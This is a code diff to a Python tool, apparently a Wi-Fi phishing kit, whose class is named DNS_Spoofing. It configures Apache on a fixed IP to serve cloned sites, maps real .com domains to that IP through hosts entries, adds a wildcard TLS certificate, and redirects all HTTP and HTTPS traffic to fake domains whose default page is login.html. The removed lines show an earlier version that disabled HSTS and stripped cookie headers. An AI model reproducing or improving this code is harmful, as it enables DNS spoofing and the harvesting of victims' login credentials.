@@ -8,7 +8,7 @@ import sys
 import shutil
 import time
 from zipfile import ZipFile
-
+value = """RewriteCond %{HTTP_HOST}^(www\\.)?([^\\.]+)\\.local$ [NC]"""
 Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
 LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
 user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
@@ -30,7 +30,7 @@ class DNS_Spoofing:
         def __init__(self):
             self.parse_args()
             self.unzip_web()
-         #   self.write_hosts()
+            self.write_hosts()
             self.VirtualHost_files()       
             self.DNS_COPY_WEB()
         def DNS_COPY_WEB(self):
@@ -54,7 +54,7 @@ class DNS_Spoofing:
                 subprocess.call(command,shell=True,stderr=subprocess.PIPE)    
                 with open("/etc/apache2/ports.conf" ,'r') as portset :
                      port = portset.read()
-                     if "172.160.255.49:80" in port :
+                     if "172.160.255.49:80"  and "172.160.255.49:443"in port :
                          pass
                      else:  
                          with open(LOG_PATH+'/resources/ports_dns.txt' ,'r') as portset :  
@@ -63,70 +63,119 @@ class DNS_Spoofing:
                               portset.write(port)   
                 os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                 os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
+                os.system("sudo a2enmod rewrite >/dev/null 2>&1")
                 os.system("systemctl restart apache2 >/dev/null 2>&1")
-                print("[+] DNS has been Start")
-               
+                if os.system("sudo apache2ctl configtest >/dev/null 2>&1") == 0 :
+                    print("[+] DNS has been Start")
+                    print("[+] Apache2 Configuration Test  Syntax OK")
+                else:
+                    print("Apache Configtest Get Error") 
+                    exit()  
+
             except FileExistsError as r  :
                 print("[+] error " ,r)
                 exit()
         def VirtualHost_files(self):
             if os.path.exists(LOG_PATH+'/VirtualHostFile'):
-                path_remove = "sudo rm -r "+LOG_PATH+'/VirtualHostFile'
-                os.system(path_remove)
-                os.makedirs(LOG_PATH+'/VirtualHostFile')
-                print("[+] VirtualHost files has been Create new intery ")
+                print("[+] VirtualHost File Found ")
             else:    
                 os.makedirs(LOG_PATH+'/VirtualHostFile')
                 print("[+] VirtualHost Folder has been Created ")
-                print("[+] VirtualHost files has been Created ")
-            for file in os.listdir(LOG_PATH+"/sites"):
-                with  open(LOG_PATH+'/VirtualHostFile/'+file+".conf",'w')as config :
-                        config = config.write(
-                                "<VirtualHost 172.160.255.49:80>"+"\n"\
-                                "\tServerAdmin   "+f'{file}'+'@'+ f'{file}'+".com"+'\n'\
-                                '\t'+"ServerName   "+f'{file}'+".com"+'\n'\
-                                "\t"+"ServerAlias  www."+f'{file}'+".com"+'\n'\
-                                "\t"+"ServerAlias  "+f'{file}'+".com"+'\n'\
-                                "\t"+"DocumentRoot /var/www/html/"+f'{file}'+'\n'+\
-                                "\tErrorLog  "+LOG_PATH+"/ServerLog/log_error.log"+'\n'\
-                                "\tCustomLog "+LOG_PATH+'/ServerLog/log_access.log combined'+'\n'\
-                                """\t<If "%"""+"{"+"HTTPS"+"}"+""" == 'on'" >"""+'\n'\
-                                "\t\tRedirect permanent / http://www."+f"{file}"+".com/"+"\n"\
-                                "\t</If>"+'\n'\
-                                "\t<IfModule mod_headers.c>"+'\n'\
-                                """\t\tHeader set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS"""+'\n'\
-                                "\t\tHeader unset Cookie"+'\n'\
-                                "\t\tHeader unset Set-Cookie"+'\n'\
-                                "\t</IfModule>"+'\n'\
-                                "\t<IfModule dir_module>"+'\n'\
-                                "\t\tDirectoryIndex index.html"+'\n'\
-                                "\t\tDirectoryIndex login.html"+'\n'\
-                                "\t\tDirectoryIndex index.php"+'\n'\
-                                "\t</IfModule>"+'\n'\
-                                "\tDumpIOInput on"+'\n'\
-                                "\tDumpIOOutput on"+'\n'\
-                                "\tLogLevel dumpio:trace7"+'\n'\
-                                "</VirtualHost>"+'\n'\
-                                "<Directory "+"/var/www/html/"+f'{file}'+">"+'\n'+\
-                                "\tOptions FollowSymLinks"+'\n'\
-                                "\tAllowOverride None"+'\n'\
-                                "\tRequire all granted"+'\n'\
-                                "</Directory>"
-                                )
-            try:
-                file_copy = 'sudo cp '+ LOG_PATH+'/VirtualHostFile/* /etc/apache2/sites-available/ '
-                copy_VirtualHost = os.system(file_copy)
-            except FileExistsError as r :
-                   print(r)
-                   exit()
+                for file in os.listdir(LOG_PATH+"/sites"):
+                    with  open(LOG_PATH+'/VirtualHostFile/'+file+".conf",'w')as config :
+                            config = config.write(
+                            f"""
+                            <VirtualHost 172.160.255.49:80>
+                                    ServerAdmin {file}@{file}.local
+                                    ServerName {file}.wifi
+                                    ServerAlias www.{file}.wifi
+                                    ServerAlias {file}.local
+                                    ServerAlias www.{file}.local
+                                    ServerAlias {file}.com
+                                    ServerAlias www.{file}.com
+
+                                    DocumentRoot /var/www/html/{file}
+                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
+                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
+                                    <IfModule dir_module>
+                                            DirectoryIndex login.html index.html index.php
+                                    </IfModule>
+                                    <IfModule mod_rewrite.c>
+                                            RewriteEngine On
+                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
+                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
+                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
+                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
+                                    </IfModule>
+
+                                    <Directory /var/www/html/{file}>
+                                        Options FollowSymLinks
+                                        AllowOverride None
+                                        Require all granted
+                                    </Directory>
+                            </VirtualHost>
+
+                            <VirtualHost 172.160.255.49:443>
+                                    ServerName {file}.wifi
+                                    ServerAlias www.{file}.wifi
+                                    ServerAlias {file}.local
+                                    ServerAlias www.{file}.local
+                                    ServerAlias {file}.com
+                                    ServerAlias www.{file}.com
+
+                                    DocumentRoot /var/www/html/{file}
+                                    SSLEngine on
+                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
+                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key
+
+                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
+                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
+                                    <IfModule dir_module>
+                                        DirectoryIndex login.html index.html index.php
+                                    </IfModule>
+                                    <IfModule mod_rewrite.c>
+                                        RewriteEngine On
+                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
+                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
+                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
+                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
+                                    </IfModule>
+
+                                    <Directory /var/www/html/{file}>
+                                        Options FollowSymLinks
+                                        AllowOverride None
+                                        Require all granted
+                                    </Directory>
+                            </VirtualHost>
+                            """
+                        )
+                try:
+                    file_copy = 'sudo cp '+ LOG_PATH+'/VirtualHostFile/* /etc/apache2/sites-available/ '
+                    copy_VirtualHost = os.system(file_copy)
+                    print("[+] VirtualHost Files has been Created ")
+                except FileExistsError as r :
+                    print(r)
+                    exit()
         def write_hosts(self):
             if os.path.exists(LOG_PATH+'/resources/hosts.txt'):
-               os.remove(LOG_PATH+'/resources/hosts.txt')
+               print("[+] Hosts dns Name List done ")
             else:
-               pass
-            for host in os.listdir(LOG_PATH+"/sites"):  
-                with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
-                   hosts.write('172.160.255.49  www.'+host+'.com     '+host+'.com'+'\n')       
+                with open(LOG_PATH+'/resources/hosts.txt','w') as hosts:
+                    for host in os.listdir(LOG_PATH+"/sites"):  
+                        with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
+                          hosts.write(
+                                    '172.160.255.49'.ljust(20) +  # Right-align IP
+                                    ('www.' + host + '.local').ljust(25) +
+                                    (host + '.local').ljust(22) +
+                                    ('www.' + host + '.wifi').ljust(25) +
+                                    (host + '.wifi').ljust(25) +
+                                    (host + '.com').ljust(25) +
+                                    ('www.' + host + '.com').ljust(25) +
+                                    '\n'
+                                )
+
+                    print("[+] Hosts dns resolve Name has be Created")
+                 
         def unzip_web(self):
             if os.path.exists(Curent_dir2+'Snake_Package/sites'):
                Set_Log()
@@ -154,3 +203,64 @@ class DNS_Spoofing:
                  exit()                
 if __name__=='__main__':
      DNS_Spoofing()
+'''
+ config = config.write(
+                            f"""
+                            <VirtualHost 172.160.255.49:80>
+                                    ServerAdmin {file}@{file}.local
+                                    ServerName {file}.wifi
+                                    ServerAlias *
+
+                                    DocumentRoot /var/www/html/{file}
+                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
+                                    CustomLog {LOG_PATH}/ServerLog/log_access.log combined
+                                    <IfModule dir_module>
+                                            DirectoryIndex login.html index.html index.php
+                                    </IfModule>
+                                    <IfModule mod_rewrite.c>
+                                            RewriteEngine On
+                                            # Redirect ALL domains except {file}.wifi to www.{file}.wifi
+                                            RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
+                                            RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
+                                             RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
+                                    </IfModule>
+
+                                    <Directory /var/www/html/{file}>
+                                        Options FollowSymLinks
+                                        AllowOverride None
+                                        Require all granted
+                                    </Directory>
+                            </VirtualHost>
+
+                            <VirtualHost 172.160.255.49:443>
+                                    ServerName {file}.wifi
+                                    ServerAlias *
+     
+
+                                    DocumentRoot /var/www/html/{file}
+                                    SSLEngine on
+                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
+                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key
+
+                                    ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
+                                    CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
+                                    <IfModule dir_module>
+                                        DirectoryIndex login.html index.html index.php
+                                    </IfModule>
+                                    <IfModule mod_rewrite.c>
+                                        RewriteEngine On
+                                        # Redirect ALL HTTPS domains except {file}.wifi to HTTP www.{file}.wifi
+                                        RewriteCond %{{HTTP_HOST}} !^{file}\\.wifi$ [NC]
+                                        RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
+                                        RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
+                                    </IfModule>
+
+                                    <Directory /var/www/html/{file}>
+                                        Options FollowSymLinks
+                                        AllowOverride None
+                                        Require all granted
+                                    </Directory>
+                            </VirtualHost>
+                            """
+                        )
+'''                        
